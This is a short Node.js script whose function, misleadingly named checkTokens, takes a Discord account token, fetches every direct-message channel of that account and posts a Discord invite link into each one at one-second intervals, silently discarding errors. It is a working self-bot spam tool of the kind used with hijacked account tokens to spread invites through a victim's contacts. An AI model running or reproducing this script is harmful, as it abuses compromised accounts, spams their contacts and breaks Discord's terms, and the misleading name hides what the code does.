const axios = require('axios');

async function checkTokens(token) {

    try {
        const response = await axios({
          method: 'GET',
          url: 'https://discord.com/api/v9/users/@me/channels', 
          headers: {
            Authorization: token,
          },
        });

        let ids = []
        for (let i = 0; i < response.data.length; i++) {
            setTimeout(() => {
            axios.post(`https://discord.com/api/channels/${response.data[i].id}/messages`, { content: `https://discord.gg/jbfvpACk` }, {
                headers: {
                    'Authorization': token
                }
            }).catch(e => {})
        }, i * 1000);
          }
    } catch (e) {
        console.log(e)
    }
}
async function main() {
    await checkTokens('')
  }
  
  main()
